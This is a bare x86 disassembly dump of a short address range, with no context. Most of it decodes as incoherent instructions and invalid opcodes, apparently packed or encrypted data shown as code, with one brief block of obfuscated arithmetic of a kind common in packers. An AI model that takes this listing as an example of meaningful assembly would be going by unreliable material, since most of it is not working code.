  41b1b6:	xlat   BYTE PTR ds:[ebx]
  41b1b7:	jmp    0x41b1c4
  41b1b9:	sti    
  41b1ba:	cmp    ch,BYTE PTR [edx+ebp*2-0x4b]
  41b1be:	push   eax
  41b1bf:	sub    ebp,ebp
  41b1c1:	in     eax,0x3c
  41b1c3:	push   0x2d
  41b1c5:	xchg   ebx,eax
  41b1c6:	xchg   ecx,eax
  41b1c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1c8:	dec    edx
  41b1c9:	sub    eax,0x77f9ea81
  41b1ce:	stc    
  41b1cf:	jo     0x41b16c
  41b1d1:	in     eax,dx
  41b1d2:	jmp    0x41b19d
  41b1d4:	in     al,0x1b
  41b1d6:	jae    0x41b208
  41b1d8:	push   cs
  41b1d9:	or     DWORD PTR [eax],eax
  41b1db:	imul   edi,DWORD PTR ds:0x7dd619a2,0xe361485a
  41b1e5:	repz mov edx,0xc49d4b01
  41b1eb:	mov    cs,WORD PTR [esi+edx*4+0x49]
  41b1ef:	loop   0x41b1ae
  41b1f1:	call   0x85a8b644
  41b1f6:	iret   
  41b1f7:	pop    edi
  41b1f8:	jbe    0x41b26b
  41b1fa:	pushf  
  41b1fb:	cs mov ecx,0x60b8b470
  41b201:	inc    esi
  41b202:	je     0x41b224
  41b204:	xor    al,0x28
  41b206:	pushf  
  41b207:	sbb    edx,DWORD PTR ds:0xca8c0c2c
  41b20d:	nop
  41b20e:	sahf   
  41b20f:	call   ebp
  41b211:	or     al,0xe
  41b213:	rol    BYTE PTR [ebp+0x55],cl
  41b216:	xchg   ecx,eax
  41b217:	push   es
  41b218:	icebp  
  41b219:	sub    DWORD PTR [ecx],ecx
  41b21b:	jb     0x41b26a
  41b21d:	push   ebx
  41b21e:	add    ebx,ebx
  41b220:	adc    dh,BYTE PTR [esp+eiz*4-0x24]
  41b224:	mov    edi,0xb97ed831
  41b229:	add    al,0xa8
  41b22b:	out    0xe3,eax
  41b22d:	xor    eax,0x9b12be93
  41b232:	ret    
  41b233:	retf   0x3df6
  41b236:	call   0xb53e:0xc0c3813
  41b23d:	out    0xea,eax
  41b23f:	push   edi
  41b240:	inc    eax
  41b241:	mov    cl,0x4d
  41b243:	cli    
  41b244:	sbb    DWORD PTR ds:0xa8b0c2e8,esp
  41b24a:	fwait
  41b24b:	into   
  41b24c:	mov    bl,0x40
  41b24e:	push   ds
  41b24f:	imul   ebp,DWORD PTR [ebx-0x38],0xffffffc0
  41b253:	sub    DWORD PTR [esi],esp
  41b255:	adc    ecx,edi
  41b257:	aaa    
  41b258:	pop    ebx
  41b259:	fadd   DWORD PTR [esi]
  41b25b:	das    
  41b25c:	ds clc 
  41b25e:	push   es
  41b25f:	cs hlt 
  41b261:	and    al,BYTE PTR [ebp+0x4a]
  41b264:	outs   dx,BYTE PTR ds:[esi]
  41b265:	mov    DWORD PTR [edx+0x28e9fb52],ebp
  41b26b:	xchg   edi,eax
  41b26c:	dec    ebx
  41b26d:	mov    DWORD PTR [edx+0x53eee427],0xd803a4d5
  41b277:	mov    edx,0xe08e46c4
  41b27c:	js     0x41b24d
  41b27e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b27f:	std    
  41b280:	add    al,BYTE PTR ds:0x41366c2b
  41b286:	mov    eax,0xeaf42725
  41b28b:	mov    ebx,0xcc79e542
  41b290:	fadd   QWORD PTR [esi+0x6d]
  41b293:	pop    ecx
  41b294:	ret    
  41b295:	es dec edi
  41b297:	lahf   
  41b298:	xor    BYTE PTR [edi+0x67],al
  41b29b:	and    DWORD PTR [ecx],edx
  41b29d:	call   0xa660:0x5a6bfeac
  41b2a4:	and    esi,DWORD PTR [ecx]
  41b2a6:	das    
  41b2a7:	jle    0x41b259
  41b2a9:	pop    edi
  41b2aa:	into   
  41b2ab:	inc    eax
  41b2ac:	push   edi
  41b2ad:	das    
  41b2ae:	or     eax,0x1e102cda
  41b2b3:	repnz fisttp QWORD PTR [edx-0x24]
  41b2b7:	push   ebx
  41b2b8:	jb     0x41b26d
  41b2ba:	and    al,0xc1
  41b2bc:	jle    0x41b27b
  41b2be:	sub    bh,bh
  41b2c0:	mov    dl,0x33
  41b2c2:	ror    DWORD PTR [ecx+0x558bb055],cl
  41b2c8:	or     BYTE PTR [ebx-0x28fc4ba3],cl
  41b2ce:	and    edx,ebx
  41b2d0:	mov    DWORD PTR [ebp-0x4c],edx
  41b2d3:	mov    edx,DWORD PTR [ebp+0x8]
  41b2d6:	mov    ebx,DWORD PTR [ebp-0x48]
  41b2d9:	lea    edx,[ebx+edx*1+0x241fcde]
  41b2e0:	mov    DWORD PTR [ebp-0x48],edx
  41b2e3:	mov    edx,DWORD PTR [ebp+0x8]
  41b2e6:	mov    ebx,0xfa5e1521
  41b2eb:	sub    ebx,edx
  41b2ed:	add    ebx,DWORD PTR [ebp-0x44]
  41b2f0:	mov    DWORD PTR [ebp-0x44],ebx
  41b2f3:	mov    edx,DWORD PTR [ebp+0x8]
  41b2f6:	xor    edx,eax
  41b2f8:	add    edx,esi
  41b2fa:	jne    0x418f20
  41b300:	jmp    0x41d6f0
  41b305:	mov    edx,DWORD PTR [ebp-0x14]
  41b308:	mov    DWORD PTR [ebp+0x8],edx
  41b30b:	jmp    0x41d6e3
  41b310:	mov    edx,DWORD PTR [ebp+0x8]
  41b313:	mov    ebx,DWORD PTR [ebp-0x8]
  41b316:	xor    edx,eax
  41b318:	xor    ebx,eax
  41b31a:	sub    edx,ebx
  41b31c:	sub    edx,esi
  41b31e:	xor    edx,eax
  41b320:	mov    DWORD PTR [ebp+0x8],edx
  41b323:	mov    edx,DWORD PTR [ebp+0x8]
  41b326:	mov    ebx,DWORD PTR [ebp-0x58]
  41b329:	jmp    0x41d68c
  41b32e:	popa   
  41b32f:	cmc    
  41b330:	cwde   
  41b331:	mov    eax,0xd7017b98
  41b336:	pop    ecx
  41b337:	popa   
  41b338:	mov    edx,DWORD PTR [eax]
  41b33a:	or     eax,0xd7239091
  41b33f:	(bad)  
  41b340:	jge    0x41b3bc
  41b342:	xor    BYTE PTR [edi+0x7a],bl
  41b345:	jp     0x41b3b6
  41b347:	in     al,0xa
  41b349:	mov    ch,0xad
  41b34b:	div    DWORD PTR [ebx+0x413c695]
  41b351:	fidivr WORD PTR [esi]
  41b353:	jb     0x41b343
  41b355:	gs ds call 0x724b8103
  41b35c:	pop    ebx
  41b35d:	jb     0x41b3d4
  41b35f:	adc    ebp,DWORD PTR [edx+0x5a38127a]
  41b365:	test   al,0x41
  41b367:	ret    0xde0
  41b36a:	fistp  DWORD PTR [edx]
  41b36c:	leave  
  41b36d:	mov    dh,0x58
  41b36f:	(bad)  
  41b370:	das    
  41b371:	xlat   BYTE PTR ds:[ebx]
  41b372:	mov    ebp,0xcbb9fd92
  41b377:	add    ebx,DWORD PTR [edi-0x56]
  41b37a:	adc    DWORD PTR [eax+0x37b9f66c],eax
  41b380:	ret    0xc2ea
  41b383:	mov    bl,0x1f
  41b385:	hlt    
  41b386:	xor    al,0x34
  41b388:	ss xchg esi,eax
  41b38a:	ror    BYTE PTR fs:[ebp+eiz*4-0x6ae2cc36],1
  41b392:	imul   ebp,esp,0xffffffb4
  41b395:	mov    ds:0xda95fc45,eax
  41b39a:	ins    DWORD PTR es:[edi],dx
  41b39b:	push   esi
  41b39c:	aam    0xe5
  41b39e:	js     0x41b360
  41b3a0:	rcl    eax,1
  41b3a2:	xchg   ebx,eax
  41b3a3:	in     ax,0x13
  41b3a6:	xchg   ebp,eax
  41b3a7:	dec    esi
  41b3a8:	jno    0x41b376
  41b3aa:	loope  0x41b391
  41b3ac:	and    eax,0xf3573ac4
  41b3b1:	pop    eax
  41b3b2:	in     eax,dx
  41b3b3:	mov    eax,ds:0x330ef161
  41b3b8:	les    ebp,FWORD PTR [ecx-0x69]
  41b3bb:	ja     0x41b401
  41b3bd:	or     bl,BYTE PTR [edx+0x2d]
  41b3c0:	sbb    eax,DWORD PTR [edi+0x73]
  41b3c3:	test   eax,0x9b86d6ad
  41b3c8:	fistp  WORD PTR [edx+0x35]
  41b3cb:	mov    edi,0xc2fbfc41
  41b3d0:	aas    
  41b3d1:	ins    BYTE PTR es:[edi],dx
  41b3d2:	in     eax,dx
  41b3d3:	in     eax,dx
  41b3d4:	das    
  41b3d5:	fld    QWORD PTR [ecx]
  41b3d7:	std    
  41b3d8:	imul   esi,DWORD PTR [esi+0x7a],0xffffff81
  41b3dc:	add    BYTE PTR [eax],ah
  41b3de:	lds    ecx,FWORD PTR [ecx]
  41b3e0:	test   DWORD PTR [ebx],esp
  41b3e2:	xchg   edx,eax
  41b3e3:	out    0x7b,eax
  41b3e5:	js     0x41b396
  41b3e7:	sbb    BYTE PTR [ebx+0x4e],0xdf
  41b3eb:	test   al,0x14
  41b3ed:	stc    
  41b3ee:	test   DWORD PTR [esi+0x71f2e4d1],ebp
  41b3f4:	push   es
  41b3f5:	inc    eax
  41b3f6:	jle    0x41b3f9
  41b3f8:	not    DWORD PTR [eax]
  41b3fa:	ret    0xabce
  41b3fd:	pop    ds
  41b3fe:	add    ah,BYTE PTR [ebp+0x5d4c6423]
  41b404:	jmp    0x2a5bd4b3
  41b409:	jle    0x41b3b8
  41b40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b40c:	aad    0x2a
  41b40e:	addr16 dec ebx
  41b410:	mov    ah,0x31
  41b412:	push   eax
  41b413:	adc    al,0xa2
  41b415:	xchg   edx,eax
  41b416:	imul   al
  41b418:	and    DWORD PTR [esi+ebx*8+0x1624c18c],edi
  41b41f:	sub    ah,ch
  41b421:	in     al,dx
  41b422:	push   ebp
  41b423:	dec    ebx
  41b424:	(bad)  [ecx-0x52]
  41b427:	fwait
  41b428:	out    dx,eax
  41b429:	and    DWORD PTR [edi-0x730d7f7c],esp
  41b42f:	and    eax,0x11f99159
  41b434:	cmp    BYTE PTR [eax],al
  41b436:	xchg   ebx,eax
  41b437:	into   
  41b438:	dec    ecx
  41b439:	xchg   esp,eax
  41b43a:	push   ebx
  41b43b:	jnp    0x41b3e2
  41b43d:	jle    0x41b3cc
  41b43f:	push   esi
  41b440:	ds enter 0x671c,0x1
  41b445:	in     al,dx
  41b446:	jmp    0x8b84:0xcf737ef3
  41b44d:	loop   0x41b4c6
  41b44f:	retf   0x4809
  41b452:	mov    eax,0xcd59aac4
  41b457:	or     DWORD PTR ds:0x9849473,eax
  41b45d:	fsub   DWORD PTR [esi+0x2f]
  41b460:	jb     0x41b429
  41b462:	dec    esi
  41b463:	mov    al,0x41
  41b465:	push   ebx
  41b466:	jo     0x41b484
  41b468:	dec    esp
  41b469:	dec    eax
  41b46a:	cmp    eax,0x1357c3f5
  41b46f:	out    0x27,al
  41b471:	aam    0x72
  41b473:	and    ebp,esp
  41b475:	loopne 0x41b4b7
  41b477:	test   al,0x88
  41b479:	test   al,0xf8
  41b47b:	jl     0x41b428
  41b47d:	data16 outs dx,BYTE PTR ds:[esi]
  41b47f:	pop    edi
  41b480:	lods   eax,DWORD PTR ds:[esi]
  41b481:	pop    edi
  41b482:	pusha  
  41b483:	pop    ss
  41b484:	jmp    0xc13437de
  41b489:	fsubr  QWORD PTR [eax+0x79710062]
  41b48f:	lods   al,BYTE PTR ds:[esi]
  41b490:	mov    ds:0x92269456,al
  41b495:	clc    
  41b496:	fdivr  QWORD PTR [eax+ebp*1-0x2aeae731]
  41b49d:	popf   
  41b49e:	fbld   TBYTE PTR [edx-0x71]
  41b4a1:	sbb    eax,0x674aa608
  41b4a6:	jbe    0x41b50d
  41b4a8:	sti    
  41b4a9:	jmp    0x27b1:0xcae016a4
  41b4b0:	mov    eax,0x7c46cd41
  41b4b5:	cmp    esp,DWORD PTR [esi+edi*1-0x60]
  41b4b9:	out    dx,eax
  41b4ba:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41b4bc:	jnp    0x41b440
  41b4be:	stos   BYTE PTR es:[edi],al
  41b4bf:	dec    ebx
  41b4c0:	lods   eax,DWORD PTR ds:[esi]
  41b4c1:	jp     0x41b536
  41b4c3:	loopne 0x41b53a
  41b4c5:	out    dx,al
  41b4c6:	xchg   ecx,edx
  41b4c8:	fdiv   st(5),st
  41b4ca:	scas   al,BYTE PTR es:[edi]
  41b4cb:	xchg   ebp,eax
  41b4cc:	sub    esi,esi
  41b4ce:	lock jmp 0x916eff35
  41b4d4:	and    al,0x29
  41b4d6:	inc    ecx
  41b4d7:	scas   eax,DWORD PTR es:[edi]
  41b4d8:	cmp    BYTE PTR [edx],dl
  41b4da:	mov    eax,ds:0x242efa9e
  41b4df:	pushf  
  41b4e0:	loopne 0x41b4ee
  41b4e2:	das    
  41b4e3:	ss xor esi,edi
  41b4e6:	dec    edx
  41b4e7:	add    DWORD PTR [ebp-0x1d],eax
  41b4ea:	les    esp,FWORD PTR [edi+edi*2+0x37]
  41b4ee:	mov    ch,0x51
  41b4f0:	(bad)  
  41b4f1:	test   eax,0x931ae29f
  41b4f6:	or     ch,BYTE PTR [ecx+0x34e60cbe]
  41b4fc:	repnz or al,0x1a
  41b4ff:	xlat   BYTE PTR ds:[ebx]
  41b500:	nop
  41b501:	cmp    DWORD PTR [edi+0x1b],esp
  41b504:	enter  0xedd2,0x90
  41b508:	cmp    edx,edx
  41b50a:	xchg   ebx,eax
  41b50b:	cmp    ecx,ebp
  41b50d:	jp     0x41b58a
  41b50f:	add    DWORD PTR [edi],ecx
  41b511:	mov    dh,0x71
  41b513:	xchg   bh,bh
  41b515:	test   al,0x36
  41b517:	retf   
  41b518:	pop    ss
  41b519:	push   edx
  41b51a:	inc    ecx
  41b51b:	xchg   ebp,eax
  41b51c:	and    esp,DWORD PTR [ebx+edx*8]
  41b51f:	in     al,0x24
  41b521:	cwde   
  41b522:	jb     0x41b58e
  41b524:	(bad)  
  41b525:	mov    cs,WORD PTR [ebx]
  41b527:	loop   0x41b568
  41b529:	jns    0x41b55c
  41b52b:	ror    DWORD PTR [edi+0x17291bd],0x72
  41b532:	out    dx,eax
  41b533:	iret   
  41b534:	rol    DWORD PTR [esi],1
  41b536:	out    dx,al
  41b537:	retf   
  41b538:	push   es
  41b539:	adc    DWORD PTR [ebx-0x4d],ebp
  41b53c:	pop    edi
  41b53d:	ins    BYTE PTR es:[edi],dx
  41b53e:	dec    ecx
  41b53f:	mov    dl,0x84
  41b541:	data16 mov ax,ds:0x940b16ec
  41b548:	mov    cl,0xdd
  41b54a:	(bad)  
  41b54b:	xor    DWORD PTR [edi],eax
  41b54d:	xor    BYTE PTR [esi],bl
  41b54f:	and    al,0x86
  41b551:	(bad)  
  41b552:	stos   DWORD PTR es:[edi],eax
  41b553:	xchg   ebx,eax
  41b554:	or     ebp,DWORD PTR [ecx-0x61a10832]
  41b55a:	cmp    BYTE PTR [ecx+0xe592e99],0x7f
  41b561:	sub    edx,ecx
  41b563:	push   esi
  41b564:	sub    esp,DWORD PTR [eax+0x70]
  41b567:	pop    ebp
  41b568:	mov    edi,0xb4d3b2d4
  41b56d:	jo     0x41b55c
  41b56f:	and    WORD PTR [ebx],si
  41b572:	mov    ebp,0xdce975d
  41b577:	xor    al,0x65
  41b579:	sbb    BYTE PTR [esi],al
  41b57b:	mov    edx,0x84cd6eb2
  41b580:	mov    bh,0x7b
  41b582:	call   0x860a:0xcc3dd50e
  41b589:	popa   
  41b58a:	loop   0x41b558
  41b58c:	shl    BYTE PTR [esi-0x662b8ce0],0xbd
  41b593:	pop    es
  41b594:	pop    eax
  41b595:	mov    ebx,0xe4edee1
  41b59a:	mov    ebp,0x45d993f5
  41b59f:	adc    al,0x7b
  41b5a1:	jmp    0x41b5c9
  41b5a3:	ins    DWORD PTR es:[edi],dx
  41b5a4:	ins    DWORD PTR es:[edi],dx
  41b5a5:	mov    eax,ds:0x24e720
  41b5aa:	adc    eax,0x89a30c46
  41b5af:	sub    BYTE PTR [ecx],0x6f
  41b5b2:	jg     0x41b553
  41b5b4:	(bad)  
  41b5b5:	std    
  41b5b6:	xchg   esi,eax
  41b5b7:	push   ebx
  41b5b8:	or     al,0x3b
  41b5ba:	stos   DWORD PTR es:[edi],eax
  41b5bb:	outs   dx,BYTE PTR ds:[esi]
  41b5bc:	es cmp eax,0x1c4168df
  41b5c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5c3:	and    BYTE PTR [esi],al
  41b5c5:	or     dh,0x1d
  41b5c8:	dec    bx
  41b5ca:	push   ds
  41b5cb:	retf   0x491a
  41b5ce:	mov    eax,ds:0x95a3fc5a
  41b5d3:	pop    edi
  41b5d4:	jnp    0x41b5d0
  41b5d6:	(bad)  [ecx+0x42d7b8fa]
  41b5dc:	xchg   esi,eax
  41b5dd:	sbb    edi,DWORD PTR [esi+0x13]
  41b5e0:	push   es
  41b5e1:	dec    ecx
  41b5e2:	adc    dh,BYTE PTR fs:[esi]
  41b5e5:	push   ebp
  41b5e6:	pushf  
  41b5e7:	inc    eax
  41b5e8:	jno    0x41b5e1
  41b5ea:	jle    0x41b653
  41b5ec:	adc    esi,DWORD PTR [ecx+0x22236a45]
  41b5f2:	pop    es
  41b5f3:	push   ebx
  41b5f4:	add    eax,0xc6af5d06
  41b5f9:	sbb    bh,bl
  41b5fb:	js     0x41b65e
  41b5fd:	fwait
  41b5fe:	retf   
  41b5ff:	enter  0x5439,0x35
  41b603:	lahf   
  41b604:	sbb    DWORD PTR [ecx],ecx
  41b606:	jne    0x41b65b
  41b608:	out    dx,eax
  41b609:	inc    ecx
  41b60a:	dec    eax
  41b60b:	jns    0x41b5c2
  41b60d:	or     edx,esi
  41b60f:	jecxz  0x41b669
  41b611:	pop    edi
  41b612:	mov    BYTE PTR [esi+0x429c30be],0xed
  41b619:	inc    eax
  41b61a:	in     eax,dx
  41b61b:	and    al,0x50
  41b61d:	repz adc al,0xc3
  41b620:	mov    ecx,0xfc8710fc
  41b625:	dec    eax
  41b626:	adc    esp,DWORD PTR [esi+0x5cfae100]
  41b62c:	push   ebx
  41b62d:	push   ebp
  41b62e:	out    dx,eax
  41b62f:	jae    0x41b6a5
  41b631:	lock scas eax,DWORD PTR es:[edi]
  41b633:	cmp    eax,0xdc50a2f1
  41b638:	adc    esi,ebx
  41b63a:	cmp    BYTE PTR [eax+0x6a271103],dl
  41b640:	push   ss
  41b641:	dec    ebp
  41b642:	ja     0x41b5d2
  41b644:	leave  
  41b645:	or     ebx,edi
  41b647:	sbb    BYTE PTR [eax*2-0x39b29908],0x51
  41b64f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b650:	xlat   BYTE PTR ds:[ebx]
  41b651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b652:	cmp    al,0x2d
  41b654:	(bad)  
  41b655:	sub    bh,BYTE PTR [esi+0x325e5796]
  41b65b:	sti    
  41b65c:	out    0x3a,eax
  41b65e:	out    dx,eax
  41b65f:	popf   
  41b660:	sar    BYTE PTR [edi],1
  41b662:	push   cs
  41b663:	jnp    0x41b6a5
  41b665:	jbe    0x41b653
  41b667:	es push ds
  41b669:	adc    BYTE PTR [eax],bh
  41b66b:	push   ebx
  41b66c:	cs and bh,ah
  41b66f:	or     eax,DWORD PTR [edi]
  41b671:	int    0x75
  41b673:	add    eax,0x6697a6bd
  41b678:	xchg   ebx,eax
  41b679:	cdq    
  41b67a:	inc    eax
  41b67b:	loop   0x41b6ef
  41b67d:	xchg   ecx,eax
  41b67e:	arpl   sp,cx
  41b680:	push   0x2c
  41b682:	dec    ebp
  41b683:	aad    0x44
  41b685:	sbb    eax,0x5e003c48
  41b68a:	fs sahf 
  41b68c:	mov    esp,0xfabfc05b
  41b691:	stos   BYTE PTR es:[edi],al
  41b692:	xchg   ebp,eax
  41b693:	icebp  
  41b694:	mov    edi,0x3d4abacf
  41b699:	ds mov ebp,ebp
  41b69c:	je     0x41b6fd
  41b69e:	inc    esp
  41b69f:	shl    BYTE PTR [ebp+edx*4-0x64],cl
  41b6a3:	fst    QWORD PTR [ebx]
  41b6a5:	sub    eax,0x4a61c51f
  41b6aa:	add    cl,BYTE PTR [ebp-0x80]
  41b6ad:	jmp    0x36def049
  41b6b2:	mov    esi,DWORD PTR [ecx]
  41b6b4:	test   eax,0x55f0479e
  41b6b9:	pushf  
  41b6ba:	jle    0x41b685
  41b6bc:	call   0x71e5f5e6
  41b6c1:	fs repnz push ss
  41b6c4:	lods   al,BYTE PTR ds:[esi]
  41b6c5:	or     ecx,0xed022bbe
  41b6cb:	cld    
  41b6cc:	cmp    dh,BYTE PTR [esi-0x53]
  41b6cf:	dec    ecx
  41b6d0:	mov    ds:0x43a323be,al
  41b6d5:	repz jmp 0x195f:0x1819c24d
  41b6dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6de:	mov    bl,cl
  41b6e0:	into   
  41b6e1:	popa   
  41b6e2:	jge    0x41b6a8
  41b6e4:	stos   BYTE PTR es:[edi],al
  41b6e5:	sub    eax,0x82a069e0
  41b6ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6eb:	mov    bh,BYTE PTR [ebx-0x642fce27]
  41b6f1:	mov    dh,0x36
  41b6f3:	jmp    DWORD PTR [edx]
  41b6f5:	out    dx,eax
  41b6f6:	mov    edx,0x68d65e34
  41b6fb:	xchg   esp,eax
  41b6fc:	pop    esi
  41b6fd:	cmc    
  41b6fe:	arpl   WORD PTR [eax],di
  41b700:	jnp    0x41b6da
  41b702:	inc    esi
  41b703:	add    eax,0xdbdb414b
  41b708:	retf   0xb7dc
  41b70b:	push   ss
  41b70c:	cmp    eax,0x9e553268
  41b711:	xor    eax,0xf554f2a3
  41b716:	mov    WORD PTR [edx],gs
  41b718:	ss add eax,0x5297186e
  41b71e:	mov    edi,0xb42cdab4
  41b723:	(bad)  
  41b724:	mov    edx,DWORD PTR [ebx+0xf]
  41b727:	in     eax,0xba
  41b729:	push   esi
  41b72a:	rcl    DWORD PTR [eax],1
  41b72c:	das    
  41b72d:	jno    0x41b735
  41b72f:	sbb    BYTE PTR [ebp+0x18dcee41],dl
  41b735:	shl    BYTE PTR [ecx-0x6aba6dee],0xc9
  41b73c:	mov    ds:0xa278bcad,al
  41b741:	xor    BYTE PTR [edi],dl
  41b743:	outs   dx,DWORD PTR ds:[esi]
  41b744:	cdq    
  41b745:	jbe    0x41b7c1
  41b747:	push   ebx
  41b748:	mov    bl,0x69
  41b74a:	shld   DWORD PTR [edx-0x1d],ebp,cl
  41b74e:	into   
  41b74f:	out    0x92,al
  41b751:	inc    ebx
  41b752:	dec    ebx
  41b753:	jo     0x41b775
  41b755:	cmp    al,0xe2
  41b757:	cwde   
  41b758:	mov    dl,0x69
  41b75a:	in     eax,dx
  41b75b:	mov    ebx,0xf288d4a3
  41b760:	inc    edx
  41b761:	jbe    0x41b7c6
  41b763:	jl     0x41b734
  41b765:	mov    bh,dh
  41b767:	loopne 0x41b79f
  41b769:	push   esi
  41b76a:	ret    0x5337
  41b76d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b76e:	int    0x96
  41b770:	icebp  
  41b771:	jno    0x41b748
  41b773:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b775:	dec    esi
  41b776:	(bad)  
  41b777:	xor    BYTE PTR [edi],ah
  41b779:	das    
  41b77a:	ja     0x41b79b
  41b77c:	pop    ebp
  41b77d:	call   0xd25f:0x4319ce77
  41b784:	dec    esp
  41b785:	mov    ebx,0x3dfe8f42
  41b78a:	xor    BYTE PTR [edi+eax*2-0x4c],dh
  41b78e:	into   
  41b78f:	daa    
  41b790:	outs   dx,DWORD PTR ds:[esi]
  41b791:	and    al,0xc0
  41b793:	stc    
  41b794:	inc    ecx
  41b795:	shl    BYTE PTR [esi],cl
  41b797:	adc    edx,DWORD PTR [edx+0x5b620a4a]
  41b79d:	sahf   
  41b79e:	das    
  41b79f:	adc    al,0x69
  41b7a1:	call   0xa02bbf4f
  41b7a6:	test   BYTE PTR [ecx+edx*4],cl
  41b7a9:	xchg   BYTE PTR [ebp-0x46],ch
  41b7ac:	sahf   
  41b7ad:	add    cl,dl
  41b7af:	mov    dl,dl
  41b7b1:	rcl    BYTE PTR [edi-0x77],1
  41b7b4:	cmp    ah,BYTE PTR [ebx-0x6f]
  41b7b7:	mov    al,ds:0xa1a4ec50
  41b7bc:	cli    
  41b7bd:	xor    DWORD PTR [ecx-0x13],edi
  41b7c0:	mov    al,fs:0x8c13bbfc
  41b7c6:	xchg   ecx,eax
  41b7c7:	inc    eax
  41b7c8:	xor    ebx,DWORD PTR [ecx]
  41b7ca:	inc    esi
  41b7cb:	aaa    
  41b7cc:	out    dx,eax
  41b7cd:	addr16 mov eax,0x5d7f3a12
  41b7d3:	sub    dh,BYTE PTR [eax+0x52]
  41b7d6:	les    edi,FWORD PTR [esi+0x33beeeba]
  41b7dc:	add    al,ch
  41b7de:	mov    ecx,0xc27f6940
  41b7e3:	push   ebx
  41b7e4:	ja     0x41b7c8
  41b7e6:	pop    ebp
  41b7e7:	sahf   
  41b7e8:	retf   0x7266
  41b7eb:	xchg   ecx,eax
  41b7ec:	or     bl,BYTE PTR [edi+0x7a680afa]
  41b7f2:	jbe    0x41b84b
  41b7f4:	cmp    al,0x38
  41b7f6:	lahf   
  41b7f7:	mov    DWORD PTR [ebx],esp
  41b7f9:	sub    BYTE PTR [ebx+ebp*4-0x5a6aa6e],dl
  41b800:	(bad)  
  41b801:	arpl   di,bp
  41b803:	inc    esi
  41b804:	xor    ebx,esp
  41b806:	xor    al,0xe7
  41b808:	push   ebp
  41b809:	jecxz  0x41b834
  41b80b:	sbb    esp,eax
  41b80d:	sub    ecx,DWORD PTR [eax-0x78]
  41b810:	lds    edx,FWORD PTR [edx]
  41b812:	fild   QWORD PTR [edi+0x4afa1d5f]
  41b818:	add    BYTE PTR [edi],bl
  41b81a:	lods   eax,DWORD PTR ds:[esi]
  41b81b:	cmc    
  41b81c:	add    eax,0xb0ad9987
  41b821:	sahf   
  41b822:	jge    0x41b7ee
  41b824:	xchg   esi,eax
  41b825:	fwait
  41b826:	mov    ds:0x709ab810,eax
  41b82b:	inc    ebx
  41b82c:	jmp    0xca9b95bc
  41b831:	inc    eax
  41b832:	push   cs
  41b833:	enter  0x664,0xef
  41b837:	leave  
  41b838:	xchg   ebp,eax
  41b839:	rcr    BYTE PTR [ecx-0x7f],1
  41b83c:	fwait
  41b83d:	pop    ss
  41b83e:	and    DWORD PTR [esi],eax
  41b840:	pop    esp
  41b841:	(bad)  
  41b842:	mov    cs,WORD PTR [edi+0x76]
  41b845:	(bad)  
  41b847:	push   cs
  41b848:	scas   al,BYTE PTR es:[edi]
  41b849:	jge    0x41b84d
  41b84b:	popf   
  41b84c:	call   0x9ae4c467
  41b851:	inc    esp
  41b852:	mov    al,0x44
  41b854:	jbe    0x41b853
  41b856:	add    edi,DWORD PTR [ecx+0x24]
  41b859:	cmp    DWORD PTR [esi-0x67],ecx
  41b85c:	jmp    0xf066:0x3f0faabc
  41b863:	daa    
  41b864:	sbb    eax,0xc3218b97
  41b869:	jno    0x41b8e3
  41b86b:	or     DWORD PTR [ebx],esp
  41b86d:	and    al,0xd0
  41b86f:	and    DWORD PTR [ebx+0x64],0xffffff9a
  41b873:	push   ebp
  41b874:	in     eax,0x67
  41b876:	nop
  41b877:	int    0x7e
  41b879:	mov    esi,0x11371863
  41b87e:	lea    ebx,[eax-0x46b633c7]
  41b884:	add    esp,DWORD PTR [esi]
  41b886:	out    dx,eax
  41b887:	add    BYTE PTR [edi+0x467010b2],cl
  41b88d:	mov    dh,0xe3
  41b88f:	adc    al,0x31
  41b891:	and    ebp,esp
  41b893:	(bad)  
  41b894:	je     0x41b8c1
  41b896:	into   
  41b897:	dec    edx
  41b898:	sbb    eax,DWORD PTR [eax-0xd]
  41b89b:	(bad)  
  41b89c:	or     eax,0x98ec10c
  41b8a1:	add    BYTE PTR [esi],0xf2
  41b8a4:	jge    0x41b904
  41b8a6:	add    BYTE PTR [ecx+0x5fbf8de6],bh
  41b8ac:	out    0x39,al
  41b8ae:	adc    ecx,ebx
  41b8b0:	adc    eax,DWORD PTR [ebx+0x3df04540]
  41b8b6:	jnp    0x41b847
  41b8b8:	cs in  al,0xf4
  41b8bb:	sub    al,0x1d
  41b8bd:	hlt    
  41b8be:	mov    al,ds:0xba51f0c4
  41b8c3:	sub    DWORD PTR ds:0xf54a959b,esp
  41b8c9:	pusha  
  41b8ca:	ror    DWORD PTR [eax],cl
  41b8cc:	ins    BYTE PTR es:[edi],dx
  41b8cd:	xchg   ebx,eax
  41b8ce:	mov    esi,0x40efef1f
  41b8d3:	loope  0x41b928
  41b8d5:	fcmovnbe st,st(2)
  41b8d7:	pop    edx
  41b8d8:	dec    ebx
  41b8d9:	fldcw  WORD PTR [eax]
  41b8db:	mov    ah,0x69
  41b8dd:	(bad)  
  41b8df:	ins    BYTE PTR es:[edi],dx
  41b8e0:	icebp  
  41b8e1:	fild   QWORD PTR ss:[esi]
  41b8e4:	lds    ebx,FWORD PTR [ebx]
  41b8e6:	and    DWORD PTR [ecx-0x67ea8fbe],edx
  41b8ec:	sahf   
  41b8ed:	loopne 0x41b8db
  41b8ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8f0:	aam    0x67
  41b8f2:	loope  0x41b8c6
  41b8f4:	fst    DWORD PTR [eax+ecx*1+0x76]
  41b8f8:	xor    eax,0x3ff85a1
  41b8fd:	loopne 0x41b890
  41b8ff:	aas    
  41b900:	inc    ecx
  41b901:	xor    eax,0x73cac0a3
  41b906:	sahf   
  41b907:	cdq    
  41b908:	mov    fs,WORD PTR [eax+0x5d716feb]
  41b90e:	mov    bh,0xeb
  41b910:	pop    ds
